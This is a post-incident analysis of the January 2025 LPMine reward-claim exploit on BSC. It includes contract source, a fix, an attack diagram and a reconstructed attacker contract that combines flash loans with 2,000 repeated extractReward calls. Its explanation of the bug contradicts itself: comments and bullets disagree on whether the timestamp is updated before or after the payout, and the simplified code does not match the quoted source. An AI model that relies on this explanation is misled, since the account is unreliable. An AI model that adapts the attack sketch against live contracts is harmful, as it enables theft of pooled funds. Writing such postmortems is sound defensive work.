# LPMine — Unlimited Reward Repeated Claim Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-11 |
| **Protocol** | LPMine |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$24,000 USDT |
| **Attacker** | Unidentified (EOA not publicly confirmed) |
| **Attack Tx** | [0x00c5...e300](https://bscscan.com/tx/0x00c5a772a58b117f142b2cbc8721b80d145ef7a910043ad08439863d0e78e300) (reward claim tx; from PoC reference) |
| **Vulnerable Contract** | [0x6BBeF6DF...](https://bscscan.com/address/0x6BBeF6DF8db12667aE88519090984e4F871e5feb) |
| **Root Cause** | `extractReward()` calculates rewards based on pair reserves without updating the timestamp, allowing repeated claims |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/LPMine_exp.sol) |

---

## 1. Vulnerability Overview

The `extractReward()` function in the LPMine contract did not update the timestamp or last claim checkpoint after distributing rewards. As a result, the attacker combined a DODO flash loan with a PancakeSwap V3 flash loan to add liquidity, then repeatedly called `extractReward(1)` 2,000 times to collect the same reward each iteration. The `skim()` function was additionally used to extract surplus tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no state update after reward payout
function extractReward(uint256 tokenId) external {
    uint256 reward = calculateReward(tokenId); // calculated based on pair reserves
    // ❌ Claim timestamp not updated → same reward recalculated on next call
    // lastClaimTime[tokenId] = block.timestamp; ← missing
    IERC20(rewardToken).transfer(msg.sender, reward);
}

function calculateReward(uint256 tokenId) internal view returns (uint256) {
    // Calculated solely from current pair reserves — claim history not reflected
    (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();
    return (reserve0 + reserve1) * rewardRate;
}

// ✅ Safe code: state updated after claim
function extractReward(uint256 tokenId) external nonReentrant {
    uint256 reward = calculateReward(tokenId);
    lastClaimTime[tokenId] = block.timestamp;   // update claim timestamp
    lastClaimBlock[tokenId] = block.number;     // update block number as well
    IERC20(rewardToken).transfer(msg.sender, reward);
}
```

### On-Chain Source Code

Source: **not verified on Sourcify** — verified on BscScan — LPMine (`0x6BBeF6DF8db12667aE88519090984e4F871e5feb`, BSC) — https://bscscan.com/address/0x6BBeF6DF8db12667aE88519090984e4F871e5feb#code

```solidity
// ✅ Source: BscScan-verified (Exact Match), Solidity v0.8.12, License: Apache-2.0
// Contract: LPMine at 0x6BBeF6DF8db12667aE88519090984e4F871e5feb (BSC)

function extractReward(uint256 _tokenId) external {
    Token memory _token = tokens[_tokenId];
    (uint256 _wtoAmount, uint256 _coarAmount) = getCanClaimed(_msgSender()); // ❌ reads current state BEFORE any guard
    PledgeInfo storage _pledge = userPledge[_msgSender()];
    uint256 _canReward;
    if (_tokenId == wtoTokenId) {
        _canReward = _wtoAmount;
        _pledge.wtoRewardTime = block.timestamp; // ❌ timestamp updated AFTER reward is transferred (see below)
    }
    if (_tokenId == coarTokenId) {
        _canReward = _coarAmount;
        _pledge.coarRewardTime = block.timestamp; // ❌ same: update happens after claimToken()
    }
    rewardPool.claimToken(_token.tokenAddress, _canReward, _msgSender()); // ❌ external call — reward paid here
    rewardParent(_tokenId, _token.tokenAddress, _canReward, _msgSender());
    emit ReceiveRewird(_msgSender(), _token.tokenAddress, _canReward, block.timestamp);
}

// getCanClaimed() — calculates reward based on live pair reserves and elapsed time
function getCanClaimed(address _user) public view returns (uint256 _wtoAmount, uint256 _coarAmount) {
    PledgeInfo memory _pledge = userPledge[_user];
    Token memory _wtoToken = tokens[wtoTokenId];
    Token memory _coarToken = tokens[coarTokenId];
    if (_pledge.wtoLpAmount > 0) {
        (uint256 _removeUsdt,) = getRemoveTokens(_wtoToken.pair, usdtAddress, _wtoToken.tokenAddress, _pledge.wtoLpAmount);
        uint256 _valueU = _removeUsdt.mul(2);
        uint256 _rewardTime = block.timestamp.sub(_pledge.wtoRewardTime); // ❌ uses live block.timestamp
        (uint256 _secondWtoAmount, uint256 _secondCoarAmount) = getEachReward(_valueU, monthFee, _wtoToken.tokenAddress, _coarToken.tokenAddress, usdtAddress);
        _wtoAmount += _rewardTime.mul(_secondWtoAmount); // ❌ reward = elapsed_seconds * per-second-rate
        _coarAmount += _rewardTime.mul(_secondCoarAmount);
    }
    if (_pledge.coarLpAmount > 0) {
        (uint256 _removeUsdt,) = getRemoveTokens(_coarToken.pair, usdtAddress, _coarToken.tokenAddress, _pledge.coarLpAmount);
        uint256 _valueU = _removeUsdt.mul(2);
        uint256 _rewardTime = block.timestamp.sub(_pledge.coarRewardTime); // ❌ uses live block.timestamp
        (uint256 _secondWtoAmount, uint256 _secondCoarAmount) = getEachReward(_valueU, monthFee, _wtoToken.tokenAddress, _coarToken.tokenAddress, usdtAddress);
        _wtoAmount += _rewardTime.mul(_secondWtoAmount);
        _coarAmount += _rewardTime.mul(_secondCoarAmount);
    }
}

// getRemoveTokens() — reads live pair balanceOf() (spot reserves), not a checkpoint
function getRemoveTokens(address _pair, address _usdtAddress, address _tokenAddress, uint256 _liquidity)
    private view returns (uint256 _removeUsdt, uint256 _removeToken)
{
    uint _usdtAmount  = IERC20(_usdtAddress).balanceOf(_pair);  // ❌ live balance — inflatable via flash loan
    uint _tokenAmount = IERC20(_tokenAddress).balanceOf(_pair);
    uint _totalSupply = IERC20(_pair).totalSupply();
    _removeUsdt  = _liquidity.mul(_usdtAmount)  / _totalSupply;
    _removeToken = _liquidity.mul(_tokenAmount) / _totalSupply;
}
```

**Why it is exploitable (identify the bug from the code):**
- `extractReward()` has no `nonReentrant` guard and no per-call cooldown: it can be called 2,000 times in a single transaction.
- `getCanClaimed()` computes reward as `elapsed_seconds * per_second_rate` where `elapsed_seconds = block.timestamp - pledge.wtoRewardTime`. Within a single transaction `block.timestamp` is constant, so every repeated call within the same block sees the same `_rewardTime` from the *previous* claim timestamp — yielding the same reward amount each time.
- The critical flaw: `_pledge.wtoRewardTime = block.timestamp` is set *before* `rewardPool.claimToken()` in code order, but because `block.timestamp` is identical for all calls in the same block, resetting it to `block.timestamp` on call N does not change the result on call N+1 (same timestamp → same `_rewardTime` computed on the next call).
- `getRemoveTokens()` reads live `balanceOf()` on the pair rather than stored reserves, so the attacker inflates it first with a PancakeSwap V3 flash loan, multiplying the per-second reward rate during all 2,000 calls.

```solidity
// ✅ Fix:
function extractReward(uint256 _tokenId) external nonReentrant {
    PledgeInfo storage _pledge = userPledge[_msgSender()];
    // ✅ Update checkpoint FIRST (Checks-Effects-Interactions)
    uint256 lastClaim;
    if (_tokenId == wtoTokenId) {
        lastClaim = _pledge.wtoRewardTime;
        _pledge.wtoRewardTime = block.timestamp; // ✅ written before external call
    } else if (_tokenId == coarTokenId) {
        lastClaim = _pledge.coarRewardTime;
        _pledge.coarRewardTime = block.timestamp;
    }
    // ✅ Compute reward using committed lastClaim (not live block.timestamp)
    (uint256 _wtoAmount, uint256 _coarAmount) = _getCanClaimedSince(_msgSender(), lastClaim);
    ...
    rewardPool.claimToken(_token.tokenAddress, _canReward, _msgSender());
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO Flash Loan: obtain 1,000 ZF tokens
  │
  ├─→ [2] Swap half of ZF → USDT
  │
  ├─→ [3] Add liquidity via partakeAddLp(tokenId=2)
  │         └─ Create ZF/USDT LP pair
  │
  ├─→ [4] PancakeSwap V3 Flash Loan: obtain 5,000,000 USDT
  │         └─ Artificially inflate pool reserves
  │
  ├─→ [5] Call extractReward(1) × 2,000 times in a loop
  │         └─ Reward paid out based on pair reserves each time
  │            Claim history not updated → same reward collected repeatedly
  │
  ├─→ [6] Call skim() to extract surplus tokens
  │
  ├─→ [7] Swap accumulated tokens → USDT
  │
  ├─→ [8] Repay both flash loans
  │
  └─→ [9] ~$24,000 USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract LPMineAttacker {
    address constant ZF = 0x259A9FB74d6A81eE9b3a3D4EC986F08fbb42121A;
    address constant LPMINE = 0x6BBeF6DF8db12667aE88519090984e4F871e5feb;
    address constant PAIR = 0xBE2F4D0C39416C7C4157eBFdccB65cc2FF5fb2C4;

    function attack() external {
        // [1] DODO Flash Loan: 1,000 ZF
        IDODO(dodoPool).flashLoan(1000e18, 0, address(this), "");
    }

    function DVMFlashLoanCall(...) external {
        // [2] Swap half of ZF → USDT
        _swap(ZF, USDT, 500e18);

        // [3] Add liquidity
        ILPMine(LPMINE).partakeAddLp(2, 500e18, 500e6);

        // [4] PancakeSwap V3 Flash Loan: 5,000,000 USDT
        IPancakeV3Pool(pcsPool).flash(
            address(this), 0, 5_000_000e6, ""
        );

        // Repay flash loan (DODO)
        IERC20(ZF).transfer(dodoPool, 1000e18 + fee);
    }

    function pancakeV3FlashCallback(...) external {
        // [5] Call extractReward 2,000 times — core vulnerability exploit
        for (uint256 i = 0; i < 2000; i++) {
            ILPMine(LPMINE).extractReward(1);
        }

        // [6] Extract surplus tokens via skim
        IPair(PAIR).skim(address(this));

        // [7] Convert tokens → USDT
        _swapAllToUSDT();

        // Repay PancakeSwap flash loan
        IERC20(USDT).transfer(pcsPool, 5_000_000e6 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Unchecked Reward State (missing claim state update) |
| **CWE** | CWE-362: Race Condition / State Desynchronization |
| **Attack Vector** | External (repeated function calls + flash loans) |
| **DApp Category** | LP Mining / Liquidity Rewards |
| **Impact** | Full drainage of the reward pool |

## 6. Remediation Recommendations

1. **Immediate state update after reward claim**: `extractReward()` must update the claim timestamp and block number on every call
2. **Checks-Effects-Interactions pattern**: Perform state changes before external transfers
3. **Rate-limit repeated calls**: Restrict the number of reward claims per `tokenId` within a given time window
4. **Improved reward calculation**: Adopt a cumulative reward index (reward per share) approach instead of relying on instantaneous reserves

## 7. Lessons Learned

- The "Checks-Effects-Interactions" pattern is essential not only for preventing reentrancy but also for preventing duplicate reward claims.
- Repeating a call 2,000 times approaches the gas limit, making defense against repeated claims within a single transaction critically important.
- The `skim()` function is a legitimate AMM mechanism for extracting surplus tokens, but when combined with a vulnerable reward mechanism it causes additional losses.